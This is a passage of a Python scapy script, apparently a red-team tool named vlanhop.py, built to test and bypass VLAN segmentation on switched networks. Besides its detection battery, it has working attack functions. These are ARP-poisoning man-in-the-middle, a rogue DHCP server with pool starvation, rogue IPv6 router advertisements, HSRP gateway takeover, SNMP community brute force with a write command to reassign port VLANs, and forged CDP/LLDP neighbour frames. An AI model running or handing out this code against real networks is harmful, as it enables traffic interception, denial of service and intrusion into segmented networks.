    for c in (R, G, Y, B, M, C, DIM, BOLD, Z):
        s = s.replace(c, "")
    return s


def print_findings(findings, title):
    w = 42
    print()
    print(f" {BOLD}{title}{Z}")
    print(" " + "─" * (w + 34))
    for f in findings:
        col = VERDICT_COLOR.get(f.status, Z)
        tag = f"{col}{f.status:<13}{Z}"
        print(f"  {BOLD}{f.name}{Z}")
        print(f"    {tag} {f.evidence[0] if f.evidence else ''}")
        for e in f.evidence[1:]:
            print(f"    {'':<13} {e}")
    print(" " + "─" * (w + 34))

    counts = defaultdict(int)
    for f in findings:
        counts[f.status] += 1
    parts = []
    for s, c in [(V_HOP, R), (V_SEG, M), (V_LIKELY, Y), (V_INCON, Y),
                 (V_ROUTED, C), (V_SAFE, G), (V_SKIP, DIM)]:
        if counts[s]:
            parts.append(f"{c}{s}: {counts[s]}{Z}")
    print(f"  {BOLD}Summary:{Z}  " + "   ".join(parts))
    print()


# ── assess command ────────────────────────────────────────────────────────────
def cmd_assess(args):
    iface = args.interface or detect_iface()
    our_mac = get_if_hwaddr(iface)
    gw_ip = args.gateway or detect_gateway()
    gw_mac = resolve_mac(gw_ip, iface) if gw_ip else None

    print(f"\n  {BOLD}VLAN Bypass Assessment{Z}  {Y}authorized use only{Z}")
    print(f"  iface={iface}  mac={our_mac}  gw={gw_ip} ({gw_mac or 'unresolved'})")
    info("battery: recon, DTP, GVRP, VTP, STP, double-tag, spoof-reach, MAC flood, DHCP")
    info("~2-3 min with full listen windows; use --fast to shorten. Ctrl+C aborts.")

    if gw_ip and not gw_mac:
        warn("gateway could not be ARP-resolved — L3 attribution will be degraded.")

    # 1) passive recon to learn native VLAN / VLAN list / platform
    rec = run_recon(iface, our_mac, args.passive)
    native = args.native_vlan or rec.get("native") or 1
    vlans = sorted(set(args.vlans or []) | rec.get("vlans", set()))
    if not vlans:
        vlans = [30, 40, 50, 60]
    info(f"Recon: native-VLAN={native}  platform={rec.get('platform') or '?'}  "
         f"VLANS={vlans}  tagged={rec['tagged']} untagged={rec['untagged']}")

    findings = []

    # 2) core bypass tests
    info("DTP switch spoofing ...")
    findings.append(run_dtp(iface, our_mac, args.timeout))
    info("GVRP dynamic-VLAN join ...")
    findings.append(run_gvrp(iface, our_mac, vlans))
    info("VTP VLAN database exposure ...")
    findings.append(run_vtp(iface, our_mac))
    info("STP root bridge takeover ...")
    findings.append(run_stp(iface, our_mac, args.timeout))

    for v in vlans:
        probe = f"10.{v}.0.1"
        info(f"VLAN double-tagging -> VLAN {v} ...")
        findings.append(run_double_tag(iface, our_mac, gw_mac, native, v, probe))

    # 3) spoof reach (ISG + inter-VLAN routing) — only with a gateway
    if gw_ip and gw_mac:
        for v in vlans:
            info(f"IP-source-guard / spoof-reach -> VLAN {v} ...")
            r = check_vlan_spoof(iface, our_mac, gw_ip, gw_mac, v, args.octet)
            f = Finding(f"IP-source-guard / inter-VLAN routing (VLAN {v})")
            if r["reachable"]:
                f.set(V_SEG,
                      f"Spoofed 10.{v}.0.{args.octet} and reached {r['svi']}.",
                      f"Replies from: {', '.join(r['reply_src']) or '?'}",
                      "No IP Source Guard + inter-VLAN routing open — cross-VLAN reach CONFIRMED (L3).")
            elif r["direct"]:
                f.set(V_ROUTED,
                      f"{r['svi']} reachable directly (no spoof needed).",
                      "Router routes between VLANs — no L2 hop, but inter-VLAN ACLs absent.")
            else:
                f.set(V_INCON,
                      f"Spoofed 10.{v}.0.{args.octet}: no reply from {r['svi']}.",
                      "ISG may be blocking, or no route to this VLAN.")
            findings.append(f)
    else:
        findings.append(Finding("IP-source-guard / inter-VLAN routing").set(
            V_SKIP, "No resolvable gateway — skipped."))

    # 4) hardening posture (informational, not bypass)
    info(f"MAC flood ({args.flood} frames) + leak detection ...")
    findings.append(run_macflood(iface, our_mac, args.flood))
    info(f"DHCP starvation ({args.dhcp} discovers) ...")
    findings.append(run_dhcp(iface, args.dhcp))

    # passive first-hop / IPv6 surface (from recon)
    if rec.get("hsrp") or rec.get("vrrp"):
        findings.append(Finding("First-hop redundancy spoof (HSRP/VRRP)").set(
            V_LIKELY,
            "HSRP/VRRP traffic present — the default gateway is a spoofable VIP.",
            f"HSRP={rec.get('hsrp')} VRRP={rec.get('vrrp')}",
            "Claim the VIP (see `hsrp`) to become the active gateway and MITM all VLANs."))
    else:
        findings.append(Finding("First-hop redundancy spoof (HSRP/VRRP)").set(
            V_SAFE, "No HSRP/VRRP frames observed on this port."))
    if rec.get("ra"):
        findings.append(Finding("IPv6 rogue-RA surface").set(
            V_LIKELY,
            f"{rec['ra']} router advertisement(s) observed — IPv6 SLAAC is in use.",
            "Send rogue RAs (see `ipv6`) to become the on-link default router."))
    else:
        findings.append(Finding("IPv6 rogue-RA surface").set(
            V_SAFE, "No IPv6 router advertisements observed on this port."))

    if rec.get("cdp") or rec.get("lldp"):
        findings.append(Finding("CDP/LLDP info leak").set(
            V_LIKELY, "Discovery frames received on access port.",
            f"CDP={rec.get('cdp')}", f"LLDP={rec.get('lldp')}",
            "(Info leak, not a bypass.)"))
    else:
        findings.append(Finding("CDP/LLDP info leak").set(
            V_SAFE, "No CDP/LLDP frames observed."))

    print_findings(findings, "ASSESSMENT RESULTS")


# ── reach command ─────────────────────────────────────────────────────────────
def cmd_reach(args):
    iface = args.interface or detect_iface()
    our_mac = get_if_hwaddr(iface)
    gw_ip = args.gateway or detect_gateway()
    gw_mac = resolve_mac(gw_ip, iface) if gw_ip else None

    print(f"\n  {BOLD}VLAN Reach (attributed){Z}  iface={iface}  gw={gw_ip} ({gw_mac})")
    print(f"  {'target':<16} {'reply MAC':<19} {'verdict'}")
    print("  " + "-" * 64)

    for t in args.targets:
        # direct (kernel routing), capture reply source MAC
        mac = None; ttl = None
        stop = threading.Event()
        def cap():
            nonlocal mac, ttl
            pkts = sniff(iface=iface, timeout=args.timeout,
                         lfilter=lambda p: ICMP in p and IP in p and p[IP].src == t,
                         stop_filter=lambda _: stop.is_set(), store=True)
            if pkts:
                mac = pkts[0][Ether].src
                ttl = pkts[0][IP].ttl
        th = threading.Thread(target=cap, daemon=True); th.start()
        os.system(f"ping -c 2 -W 1 {t} >/dev/null 2>&1")
        time.sleep(args.timeout + 0.2)
        stop.set(); th.join(1)

        if mac is None:
            verdict = f"{R}no reply{Z}"
        elif gw_mac and mac.lower() == gw_mac.lower():
            verdict = f"{C}ROUTED (L3){Z} — routing, not a VLAN hop"
        else:
            verdict = f"{R}L2 REACH{Z} — non-gateway MAC answered"
        print(f"  {t:<16} {str(mac or '-'):<19} {verdict}  (ttl={ttl})")

        # if direct failed, try spoof (ISG/segmentation)
        if mac is None and gw_mac:
            vlan = int(t.split(".")[1])
            r = check_vlan_spoof(iface, our_mac, gw_ip, gw_mac, vlan, args.octet)
            if r["reachable"]:
                print(f"  {'':<16} {'':<19} {M}L3-SEG (spoof){Z} — ISG absent + inter-VLAN routing")
            else:
                print(f"  {'':<16} {'':<19} {Y}INCONCLUSIVE{Z} — spoof also failed")
    print()


# ── map command ───────────────────────────────────────────────────────────────
def cmd_map(args):
    iface = args.interface or detect_iface()
    our_mac = get_if_hwaddr(iface)
    gw_ip = args.gateway or detect_gateway()
    if not gw_ip:
        sys.exit("[!] no gateway found; pass --gateway")
    gw_mac = resolve_mac(gw_ip, iface)
    if not gw_mac:
        sys.exit("[!] cannot resolve gateway")

    r = check_vlan_spoof(iface, our_mac, gw_ip, gw_mac, args.vlan, args.octet)
    if not r["reachable"] and not r["direct"]:
        sys.exit(f"[!] VLAN {args.vlan} not reachable via spoof or direct — nothing to map.")

    use_spoof = r["reachable"]
    method = "spoofed src" if use_spoof else "direct (routed)"
    subnet = f"10.{args.vlan}.0.0/24"
    print(f"\n  {BOLD}Mapping VLAN {args.vlan} ({subnet}) [{method}]{Z}\n")

    ctx = spoof_setup(iface, our_mac, gw_ip, gw_mac, args.vlan, args.octet) if use_spoof else None
    try:
        live = nmap_discover(subnet, iface, spoof=ctx)
        if live:
            ok(f"{len(live)} host(s) up: {', '.join(live)}")
            gnmap = nmap_scan(subnet, args.vlan, live, iface, args, spoof=ctx)
        else:
            warn("no live hosts in discovery — scanning full subnet")
            gnmap = nmap_scan(subnet, args.vlan, subnet, iface, args, spoof=ctx)
        summarize_gnmap(gnmap, args.vlan, subnet)
    finally:
        if ctx:
            spoof_teardown(ctx)
    ok("Done.")


# ── hosts command ─────────────────────────────────────────────────────────────
def cmd_hosts(args):
    iface = args.interface or detect_iface()
    gw = args.gateway or detect_gateway()
    if not gw:
        sys.exit("[!] no gateway found; pass --gateway")

    # baseline gateway TTL: reply generated by the gateway's own stack
    gw_ttl = None
    a = sr1(IP(dst=gw) / ICMP(), timeout=1.5)
    if a and IP in a:
        gw_ttl = a[IP].ttl
    if gw_ttl is None:
        for dport in (80, 443, 22, 23, 8291):
            a = sr1(IP(dst=gw) / TCP(dport=dport, flags="S"), timeout=1.5)
            if a and IP in a:
                gw_ttl = a[IP].ttl
                break
    info(f"gateway {gw} reply TTL = {gw_ttl}")
    if gw_ttl is None:
        warn("could not get a gateway reply; assuming TTL 64 baseline")
        gw_ttl = 64

    for net in args.subnets:
        base = ".".join(net.split("/")[0].split(".")[:3])
        pkts = [IP(dst=f"{base}.{h}") / TCP(dport=p, flags="S")
                for h in range(1, 255) for p in args.ports]
        info(f"SYN-sweeping {net} ({len(pkts)} probes) ...")
        ans, _ = sr(pkts, timeout=1.5, retry=0, verbose=0)
        byip = defaultdict(dict)
        for sent, recv in ans:
            if IP not in recv:
                continue
            ip = recv[IP].src
            ttl = recv[IP].ttl
            if TCP in recv:
                f = "SA" if recv[TCP].flags & 0x12 == 0x12 else (
                    "RA" if recv[TCP].flags & 0x04 else "?")
            elif ICMP in recv:
                f = "unreach"
            else:
                f = "?"
            byip[ip][sent[TCP].dport] = (f, ttl)

        hist = defaultdict(int)
        for ports in byip.values():
            for (f, ttl) in ports.values():
                hist[ttl] += 1
        info(f"response TTL histogram: {dict(sorted(hist.items()))}")

        real = [ip for ip, ports in byip.items()
                if any(ttl < gw_ttl for (f, ttl) in ports.values())]
        print(f"  {B}{'IP':<16} {'open (real hosts, TTL < gw)':<44}{Z}")
        print("  " + "-" * 62)
        for ip in sorted(real, key=lambda x: tuple(map(int, x.split(".")))):
            ports = byip[ip]
            opens = [f"{p}/{f}" for p, (f, ttl) in sorted(ports.items()) if f == "SA"]
            print(f"  {G}{ip:<16}{Z} " + (", ".join(opens) if opens else "no open ports"))
        print("  " + "-" * 62)
        ok(f"{len(real)} real host(s) in {net} (everything else is the gateway proxying).")


# ── ARP MITM ─────────────────────────────────────────────────────────────────
def run_mitm(iface, our_mac, gw_ip, gw_mac, victims, duration, forward):
    """ARP-spoof a list of victims (and the gateway) to place us on the path."""
    victim_macs = {}
    for v in victims:
        m = resolve_mac(v, iface, timeout=2)
        if m:
            victim_macs[v] = m
        else:
            warn(f"could not resolve {v} — skipping")
    if not victim_macs:
        bad("no victims resolved")
        return

    info(f"poisoning {len(victim_macs)} victim(s) <-> {gw_ip} for {duration}s")
    old_fwd = None
    if forward:
        rc, out = sh("sysctl -n net.ipv4.ip_forward")
        old_fwd = out.strip()
        sh("sysctl -w net.ipv4.ip_forward=1 >/dev/null")
        ok(f"IP forwarding enabled (was {old_fwd})")

    t0 = time.time()
    n = 0
    try:
        while time.time() - t0 < duration:
            for v, vm in victim_macs.items():
                # victim: "gateway is at our MAC"
                sendp(Ether(src=our_mac, dst=vm)
                      / ARP(op=2, hwsrc=our_mac, psrc=gw_ip, hwdst=vm, pdst=v),
                      iface=iface, verbose=False)
                # gateway: "victim is at our MAC"
                sendp(Ether(src=our_mac, dst=gw_mac)
                      / ARP(op=2, hwsrc=our_mac, psrc=v, hwdst=gw_mac, pdst=gw_ip),
                      iface=iface, verbose=False)
            n += 1
            time.sleep(1.0)
    except KeyboardInterrupt:
        warn("interrupted — restoring ARP")
    finally:
        ok("restoring ARP caches ...")
        for v, vm in victim_macs.items():
            for _ in range(3):
                sendp(Ether(src=our_mac, dst=vm)
                      / ARP(op=2, hwsrc=gw_mac, psrc=gw_ip, hwdst=vm, pdst=v),
                      iface=iface, verbose=False)
                sendp(Ether(src=our_mac, dst=gw_mac)
                      / ARP(op=2, hwsrc=vm, psrc=v, hwdst=gw_mac, pdst=gw_ip),
                      iface=iface, verbose=False)
                time.sleep(0.2)
        if forward and old_fwd is not None:
            sh(f"sysctl -w net.ipv4.ip_forward={old_fwd} >/dev/null")
            ok("IP forwarding restored")
    ok(f"done ({n} poison round(s)).")


# ── rogue DHCP server ────────────────────────────────────────────────────────
def build_dhcp_offer(our_mac, server_ip, client_mac, yiaddr, xid, gw_ip, dns_ip, lease=600):
    return (Ether(src=our_mac, dst=client_mac)
            / IP(src=server_ip, dst="255.255.255.255")
            / UDP(sport=67, dport=68)
            / BOOTP(op=2, yiaddr=yiaddr, siaddr=server_ip,
                    chaddr=bytes.fromhex(client_mac.replace(":", "")),
                    xid=xid, flags=0x8000)
            / DHCP(options=[("message-type", "offer"),
                            ("server_id", server_ip),
                            ("subnet_mask", "255.255.255.0"),
                            ("router", gw_ip),
                            ("name_server", dns_ip),
                            ("lease_time", lease),
                            "end"]))


def run_rogue_dhcp(iface, our_mac, our_ip, router, dns, pool_base, duration, starvation):
    if starvation:
        info(f"DHCP starvation first ({starvation} DISCOVERs) ...")
        for _ in range(starvation):
            sendp(build_dhcp_discover(rand_mac()), iface=iface, verbose=False)
        time.sleep(2)

    base = ".".join(pool_base.split(".")[:3])
    counter = [int(pool_base.split(".")[3])]
    used = set()

    def next_ip():
        while counter[0] < 254:
            ip = f"{base}.{counter[0]}"
            counter[0] += 1
            if ip not in used:
                used.add(ip)
                return ip
        return f"{base}.{counter[0]}"

    offers = [0]
    def cb(pkt):
        if not (Ether in pkt and UDP in pkt and pkt[UDP].dport == 67 and DHCP in pkt):
            return
        if dhcp_type(pkt) != 1:           # DISCOVER only
            return
        cmac = pkt[Ether].src
        xid = pkt[BOOTP].xid
        yiaddr = next_ip()
        sendp(build_dhcp_offer(our_mac, our_ip, cmac, yiaddr, xid, router, dns),
              iface=iface, verbose=False)
        offers[0] += 1
        ok(f"OFFER -> {cmac} ({yiaddr})")

    info(f"rogue DHCP on {iface} for {duration}s (router={router} dns={dns})")
    sniff(iface=iface, filter="udp and port 67", prn=cb, timeout=duration, store=False)
    ok(f"{offers[0]} offer(s) sent.")


# ── IPv6 rogue router advertisement ──────────────────────────────────────────
def mac2ll(mac):
    b = [int(x, 16) for x in mac.split(":")]
    b[0] ^= 0x02
    return "fe80::%02x%02x:%02xff:fe%02x:%02x%02x" % (b[0], b[1], b[2], b[3], b[4], b[5])


def build_ra(our_mac, prefix, lifetime=1800, pref_len=64):
    ll = mac2ll(our_mac)
    return (Ether(src=our_mac, dst="33:33:00:00:00:01")
            / IPv6(src=ll, dst="ff02::1", hlim=255)
            / ICMPv6ND_RA(routerlifetime=lifetime, M=1, O=1)
            / ICMPv6NDOptSrcLLAddr(lladdr=our_mac)
            / ICMPv6NDOptMTU(mtu=1500)
            / ICMPv6NDOptPrefixInfo(prefixlen=pref_len, prefix=prefix,
                                    validlifetime=lifetime, preferredlifetime=lifetime,
                                    A=1, L=1))


def build_rs(our_mac):
    ll = mac2ll(our_mac)
    return (Ether(src=our_mac, dst="33:33:00:00:00:02")
            / IPv6(src=ll, dst="ff02::2", hlim=255)
            / ICMPv6ND_RS())


def run_ipv6_ra(iface, our_mac, prefix, lifetime, duration, interval=10):
    if not HAVE_INET6:
        bad("scapy inet6 support missing; pip install -U scapy")
        return

    def reply_rs(pkt):
        if ICMPv6ND_RS in pkt and Ether in pkt:
            sendp(build_ra(our_mac, prefix, lifetime), iface=iface, verbose=False)
            info("answered Router Solicitation with RA")

    t = threading.Thread(target=lambda: sniff(iface=iface, timeout=duration,
                                              lfilter=lambda p: ICMPv6ND_RS in p,
                                              prn=reply_rs, store=False), daemon=True)
    t.start()
    info(f"advertising router {mac2ll(our_mac)} prefix {prefix} for {duration}s")
    t0 = time.time(); n = 0
    while time.time() - t0 < duration:
        sendp(build_ra(our_mac, prefix, lifetime), iface=iface, verbose=False)
        n += 1
        time.sleep(interval)
    t.join(1)
    ok(f"{n} RA(s) sent.")


# ── HSRP first-hop spoof ─────────────────────────────────────────────────────
def build_hsrp_hello(our_ip, group=1, priority=255, version=1):
    if version == 1:
        hello = struct.pack(">BBBBBBBB", 0, 0, 16, 3, 10, priority, group, 0) + b"cisco" + b"\x00" * 3
        return (Ether(src="00:00:0c:07:ac:%02x" % group, dst="01:00:5e:00:00:02")
                / IP(src=our_ip, dst="224.0.0.2", ttl=1)
                / UDP(sport=1985, dport=1985)
                / Raw(hello))
    hello = struct.pack(">BBBBBBBB", 2, 0, 16, 3, 10, priority, group, 0) + b"cisco" + b"\x00" * 3
    return (Ether(src="00:00:0c:9f:%02x" % group, dst="01:00:5e:00:00:66")
            / IP(src=our_ip, dst="224.0.0.102", ttl=1)
            / UDP(sport=1985, dport=1985)
            / Raw(hello))


def run_hsrp_spoof(iface, our_mac, our_ip, vip, group, priority, version, duration, interval=3):
    info(f"HSRP v{version} active-claim for VIP {vip} group {group} prio {priority}")
    t0 = time.time(); n = 0
    while time.time() - t0 < duration:
        sendp(build_hsrp_hello(our_ip, group, priority, version), iface=iface, verbose=False)
        # gratuitous ARP so hosts point the VIP at our MAC immediately
        sendp(Ether(src=our_mac, dst="ff:ff:ff:ff:ff:ff")
              / ARP(op=2, hwsrc=our_mac, psrc=vip,
                    hwdst="ff:ff:ff:ff:ff:ff", pdst=vip),
              iface=iface, verbose=False)
        n += 1
        time.sleep(interval)
    ok(f"{n} HSRP hello(s) + GARP sent.")


# ── SNMP community brute + VLAN enumeration ──────────────────────────────────
DEFAULT_COMMUNITIES = ["public", "private", "community", "snmp", "admin", "cisco",
                       "read", "write", "public@1", "monitor", "secret"]


def run_snmp(target, communities):
    if not tool_ok("snmpget"):
        bad("net-snmp not installed: apt install snmp")
        return
    info(f"SNMP v1/v2c community brute against {target} ...")
    found = None
    for c in communities:
        rc, out = sh(f"snmpget -v1 -c {c} -On -t 1 -r 0 {target} 1.3.6.1.2.1.1.1.0")
        if rc == 0 and "1.3.6.1.2.1.1.1.0" in out:
            found = c
            ok(f"community '{c}' reads sysDescr: {out.strip()}")
            break
    if not found:
        bad("no default community accepted (or SNMP filtered).")
        return

    rc, out = sh(f"snmpwalk -v1 -c {found} -On -t 2 {target} 1.3.6.1.2.1.17.7.1.4.3.1.1")
    vlans = {}
    for line in out.splitlines():
        if "=" in line:
            oid, _, val = line.partition("=")
            try:
                vid = int(oid.strip().rstrip(".").split(".")[-1])
                name = val.strip().split(":", 1)[-1].strip().strip('"')
                if 0 < vid < 4095:
                    vlans[vid] = name
            except Exception:
                pass
    if vlans:
        ok(f"{len(vlans)} VLAN(s) enumerated: {sorted(vlans)}")
        for vid in sorted(vlans):
            print(f"      VLAN {vid:<4} {vlans[vid]}")

    if found.lower() in ("private", "write", "admin", "rw"):
        bad(f"community '{found}' is commonly read-write — SNMP SET can reassign port VLANs.")
        info("  snmpset -v1 -c private <switch> 1.3.6.1.2.1.17.7.1.4.3.1.5.<port>.<vlan> i <vlan>")
        info("  (this is a full VLAN bypass — verify and report).")
    else:
        info(f"community '{found}' appears read-only; VLAN DB exposed but not writable via this community.")


# ── neighbor spoof (forged CDP / LLDP) ───────────────────────────────────────
def build_cdp_spoof(our_mac, device_id, platform, vlan, mgmt_ip):
    def tlv(t, v): return struct.pack(">HH", t, 4 + len(v)) + v
    payload = (b"\x01\x00\x00\x00"     # version 1, ttl 0, checksum 0 (ignored by receivers)
               + tlv(0x0001, device_id.encode())
               + tlv(0x0006, platform.encode())
               + tlv(0x0004, b"\x00\x00\x00\x04")   # capabilities: L2 switch
               + tlv(0x000a, struct.pack(">H", vlan))
               + tlv(0x0016, socket.inet_aton(mgmt_ip)))
    return (Ether(dst="01:00:0c:cc:cc:cc", src=our_mac)
            / LLC(dsap=0xaa, ssap=0xaa, ctrl=0x03)
            / SNAP(OUI=0x00000c, code=0x2000)
            / payload)


def build_lldp_spoof(our_mac, system_name, port_desc):
    def tlv(t, v):
        l = 2 + len(v)
        return bytes([(t << 1) | ((l >> 8) & 1), l & 0xFF]) + v
    chassis = b"\x04" + bytes.fromhex(our_mac.replace(":", ""))
    pdu = (tlv(1, chassis)
           + tlv(2, b"\x07" + port_desc.encode())
           + tlv(3, b"\x00\x78")
           + tlv(5, system_name.encode())
           + tlv(7, b"\x00\x00\x00\x28\x00\x00"))
    return Ether(dst="01:80:c2:00:00:0e", src=our_mac) / Raw(pdu)


def run_neighbor_spoof(iface, our_mac, mode, device_id, platform, vlan, mgmt_ip, duration, interval=10):
    info(f"injecting forged {mode.upper()} neighbor advertisements for {duration}s")
    t0 = time.time(); n = 0
    while time.time() - t0 < duration:
        if mode in ("cdp", "both"):
            sendp(build_cdp_spoof(our_mac, device_id, platform, vlan, mgmt_ip),
                  iface=iface, verbose=False)
        if mode in ("lldp", "both"):
            sendp(build_lldp_spoof(our_mac, device_id, f"Gi0/{vlan}"),
                  iface=iface, verbose=False)
        n += 1
        time.sleep(interval)
    ok(f"{n} spoof frame(s) sent.")


# ── active red-team command wrappers ─────────────────────────────────────────
def cmd_mitm(args):
    iface = args.interface or detect_iface()
    our_mac = get_if_hwaddr(iface)
    gw_ip = args.gateway or detect_gateway()
    if not gw_ip:
        sys.exit("[!] no gateway; pass --gateway")
    gw_mac = resolve_mac(gw_ip, iface)
    if not gw_mac:
        sys.exit("[!] cannot resolve gateway MAC")
    print(f"\n  {BOLD}ARP MITM{Z}  iface={iface}  gw={gw_ip} ({gw_mac})")
    run_mitm(iface, our_mac, gw_ip, gw_mac, args.targets, args.duration,
             forward=not args.no_forward)


def cmd_rogue_dhcp(args):
    iface = args.interface or detect_iface()
    our_mac = get_if_hwaddr(iface)
    our_ip = get_if_addr(iface)
    if not our_ip or our_ip == "0.0.0.0":
        sys.exit("[!] no IPv4 on interface")
    router = args.router or our_ip
    dns = args.dns or our_ip
    pool = args.pool_start or ".".join(our_ip.split(".")[:3]) + ".100"
    print(f"\n  {BOLD}Rogue DHCP{Z}  iface={iface}  router={router}  dns={dns}  pool={pool}")
    run_rogue_dhcp(iface, our_mac, our_ip, router, dns, pool, args.duration, args.starvation)


def cmd_ipv6(args):
    iface = args.interface or detect_iface()
    our_mac = get_if_hwaddr(iface)
    print(f"\n  {BOLD}Rogue IPv6 RA{Z}  iface={iface}  prefix={args.prefix}")
    run_ipv6_ra(iface, our_mac, args.prefix, args.lifetime, args.duration)


def cmd_hsrp(args):
    iface = args.interface or detect_iface()
    our_mac = get_if_hwaddr(iface)
    our_ip = get_if_addr(iface) or "0.0.0.0"
    print(f"\n  {BOLD}HSRP first-hop spoof{Z}  iface={iface}  vip={args.vip} group={args.group}")
    run_hsrp_spoof(iface, our_mac, our_ip, args.vip, args.group, args.priority,
                   args.version, args.duration)


def cmd_snmp(args):
    print(f"\n  {BOLD}SNMP enumeration{Z}  target={args.target}")
    run_snmp(args.target, args.communities)


def cmd_neighbor_spoof(args):
    iface = args.interface or detect_iface()
    our_mac = get_if_hwaddr(iface)
    print(f"\n  {BOLD}Neighbor spoof{Z}  iface={iface}  mode={args.mode}")
    run_neighbor_spoof(iface, our_mac, args.mode, args.device_id, args.platform,
                       args.vlan, args.mgmt_ip, args.duration)


# ── CLI ───────────────────────────────────────────────────────────────────────
def add_common(sp):
    sp.add_argument("-i", "--interface", default=argparse.SUPPRESS)
    sp.add_argument("--gateway", default=argparse.SUPPRESS)
    sp.add_argument("--vlans", type=int, nargs="+", default=argparse.SUPPRESS)
    sp.add_argument("--native-vlan", type=int, default=argparse.SUPPRESS)
    sp.add_argument("--timeout", type=int, default=argparse.SUPPRESS)
    sp.add_argument("--fast", action="store_true", default=argparse.SUPPRESS)


def main():
    p = argparse.ArgumentParser(
        prog="vlanhop.py",
        description="Consolidated VLAN bypass scanner — low false-positive (authorized use only)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=__doc__)
    p.add_argument("-i", "--interface", help="interface (default: one owning the default route)")
    p.add_argument("--gateway", help="default gateway IP (default: auto-detected)")
    p.add_argument("--vlans", type=int, nargs="+", help="VLAN ids (subnet 10.<id>.0.0/24)")
    p.add_argument("--native-vlan", type=int, help="port native VLAN (default: from CDP recon or 1)")
    p.add_argument("--timeout", type=int, default=8, help="capture window per test (default 8s)")
    p.add_argument("--octet", type=int, default=240, help="last octet of spoofed IP (default 240)")
    p.add_argument("--fast", action="store_true",
                   help="shorten listen windows (~2x faster, slightly more false negatives)")

    sub = p.add_subparsers(dest="cmd")

    a = sub.add_parser("assess", help="run the full low-FP detection battery (default)")
    add_common(a)
    a.add_argument("--passive", type=int, default=12, help="passive recon seconds (default 12)")
    a.add_argument("--flood", type=int, default=5000, help="MAC flood frame count")
    a.add_argument("--dhcp", type=int, default=60, help="DHCP DISCOVER count")
    a.add_argument("--octet", type=int, default=240)

    r = sub.add_parser("recon", help="passive: learn VLANs, native VLAN, switch platform")
    add_common(r)
    r.add_argument("--seconds", type=int, default=20)

    rc = sub.add_parser("reach", help="attribute reachability (L2 hop vs L3 routing) for targets")
    add_common(rc)
    rc.add_argument("--targets", required=True, nargs="+", metavar="IP")

    m = sub.add_parser("map", help="nmap a confirmed-reachable VLAN (spoofed source)")
    add_common(m)
    m.add_argument("--vlan", type=int, required=True)
    m.add_argument("--ports", help="nmap -p argument")
    m.add_argument("--no-os", action="store_true")
    m.add_argument("--connect", action="store_true", help="use -sT instead of -sS")
    m.add_argument("--host-timeout", type=int, default=90)
    m.add_argument("--octet", type=int, default=240)

    h = sub.add_parser("hosts", help="find real hosts behind a proxy-ARP gateway")
    add_common(h)
    h.add_argument("--subnets", nargs="+", default=["10.30.0.0/24", "10.40.0.0/24",
                                                    "10.50.0.0/24", "10.60.0.0/24"])
    h.add_argument("--ports", type=int, nargs="+", default=[22, 80, 443, 445, 3389, 8080])

    mi = sub.add_parser("mitm", help="ARP-spoof MITM between victim host(s) and the gateway")
    add_common(mi)
    mi.add_argument("--targets", required=True, nargs="+", metavar="IP", help="victim IPs to poison")
    mi.add_argument("--duration", type=int, default=60, help="seconds to poison (default 60)")
    mi.add_argument("--no-forward", action="store_true",
                    help="do NOT enable IP forwarding (traffic dropped = DoS)")

    dh = sub.add_parser("rogue-dhcp", help="rogue DHCP server (redirect gateway/DNS to us)")
    add_common(dh)
    dh.add_argument("--pool-start", default=None, help="first IP to hand out (default 10.x.0.100)")
    dh.add_argument("--router", default=None, help="default gateway to advertise (default: our IP)")
    dh.add_argument("--dns", default=None, help="DNS server to advertise (default: our IP)")
    dh.add_argument("--starvation", type=int, default=0, help="exhaust the real pool first (DISCOVER count)")
    dh.add_argument("--duration", type=int, default=60)

    v6 = sub.add_parser("ipv6", help="rogue IPv6 router advertisement (SLAAC takeover)")
    add_common(v6)
    v6.add_argument("--prefix", default="fd00::", help="advertised prefix (default fd00::)")
    v6.add_argument("--lifetime", type=int, default=1800, help="router lifetime seconds (default 1800)")
    v6.add_argument("--duration", type=int, default=60)

    hs = sub.add_parser("hsrp", help="HSRP/VRRP first-hop spoof (claim the default gateway)")
    add_common(hs)
    hs.add_argument("--vip", required=True, help="virtual IP (default gateway VIP) to claim")
    hs.add_argument("--group", type=int, default=1)
    hs.add_argument("--priority", type=int, default=255)
    hs.add_argument("--version", type=int, choices=[1, 2], default=1)
    hs.add_argument("--duration", type=int, default=60)

    sn = sub.add_parser("snmp", help="SNMP community brute + VLAN DB enumeration")
    add_common(sn)
    sn.add_argument("--target", required=True, help="switch/router IP")
    sn.add_argument("--communities", nargs="+", default=DEFAULT_COMMUNITIES)

    ns = sub.add_parser("neighbor-spoof", help="forge CDP/LLDP advertisements (switch/trunk impersonation)")
    add_common(ns)
    ns.add_argument("--mode", choices=["cdp", "lldp", "both"], default="both")
    ns.add_argument("--device-id", default="ATTACKER-SW")
    ns.add_argument("--platform", default="cisco C2950")
    ns.add_argument("--vlan", type=int, default=1, help="native-VLAN to advertise")
    ns.add_argument("--mgmt-ip", default="10.0.0.99")
    ns.add_argument("--duration", type=int, default=30)

    args = p.parse_args()

    if args.cmd is None:
        args.cmd = "assess"

    global SPEEDUP
    SPEEDUP = 0.4 if getattr(args, "fast", False) else 1.0

    if args.cmd in ("assess", "recon", "reach", "map", "hosts",
                    "mitm", "rogue-dhcp", "ipv6", "hsrp", "snmp", "neighbor-spoof"):
        need_root()

    if args.cmd == "assess":
        cmd_assess(args)
    elif args.cmd == "recon":
        iface = args.interface or detect_iface()
        our_mac = get_if_hwaddr(iface)
        rec = run_recon(iface, our_mac, args.seconds)
        print(f"\n  {BOLD}Recon results{Z}")
        print(f"  native-vlan : {rec['native'] or 'unknown'}")
        print(f"  platform    : {rec['platform'] or 'unknown'}")
        print(f"  vlans       : {sorted(rec['vlans']) if rec['vlans'] else 'none'}")
        print(f"  tagged/untagged frames: {rec['tagged']}/{rec['untagged']}")
        print()
    elif args.cmd == "reach":
        cmd_reach(args)
    elif args.cmd == "map":
        if not tool_ok("nmap"):
            sys.exit("[!] nmap is required: apt install nmap")
        cmd_map(args)
    elif args.cmd == "hosts":
        cmd_hosts(args)
    elif args.cmd == "mitm":
        cmd_mitm(args)
    elif args.cmd == "rogue-dhcp":
        cmd_rogue_dhcp(args)
    elif args.cmd == "ipv6":
        cmd_ipv6(args)
    elif args.cmd == "hsrp":
        cmd_hsrp(args)
    elif args.cmd == "snmp":
        cmd_snmp(args)
    elif args.cmd == "neighbor-spoof":
        cmd_neighbor_spoof(args)


if __name__ == "__main__":
    main()
